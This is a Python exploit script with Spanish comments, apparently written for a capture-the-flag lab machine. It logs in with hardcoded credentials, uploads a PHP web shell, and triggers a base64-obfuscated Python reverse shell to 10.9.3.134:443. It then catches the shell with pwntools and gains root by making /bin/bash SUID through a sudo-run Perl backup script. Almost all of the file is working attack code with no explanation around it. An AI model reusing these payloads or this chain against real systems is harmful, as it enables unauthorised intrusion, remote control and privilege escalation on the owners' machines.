import requests
import signal
import sys
import threading
import time
import pdb
from pwn import *
 
# Ctrl+C
def def_handler(sig, frame):
    print "\n[!] Saliendo...\n"
    sys.exit(1)
 
if len(sys.argv) != 2:
    print "\n[+] Uso: python " + sys.argv[0] + " filename"
    sys.exit(1)
 
# Variables globales
filename = sys.argv[1]
lport = 443
 
def uploadFile():
 
    login_url = "http://10.10.238.51/content/as/?type=signin"
    upload_file_url = "http://10.10.238.51/content/as/?type=ad&mode=save"
    cmd_url = "http://10.10.238.51/content/inc/ads/%s.php" % filename
 
    login_data = {
        'user': 'manager',
        'passwd': 'Password123',
        'rememberMe': ''
    }
 
    upload_file_data = {
        'adk': '%s' % filename,
        'adv': '<?php system($_REQUEST["cmd"]); ?>'
    }
 
    command_to_execute = {
        'cmd': 'echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuOS4zLjEzNCIsNDQzKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsnCg== | base64 -d | bash'
    }
 
    s = requests.session()
 
    s.post(login_url, data=login_data)
    s.post(upload_file_url, data=upload_file_data)
 
    requests.post(cmd_url, data=command_to_execute)
 
 
if __name__ == '__main__':
 
    try:
        threading.Thread(target=uploadFile, args=()).start()
    except Exception as e:
        log.error(str(e))
 
    p1 = log.progress("Acceso al sistema")
    p1.status("Esperando la shell")
 
    shell = listen(lport, timeout=20).wait_for_connection()
 
    if shell.sock is None:
        p1.failure("No se ha ganado acceso al sistema")
    else:
        p1.success("Se ha ganado acceso al sistema")
 
    p2 = log.progress("Escalada de privilegios")
    p2.status("Abusando del privilegio asignado")
    time.sleep(2)
 
    shell.sendline("echo 'chmod 4755 /bin/bash' > /etc/copy.sh")
    shell.sendline("sudo -u root /usr/bin/perl /home/itguy/backup.pl")
    shell.sendline("bash -p")
    shell.interactive()
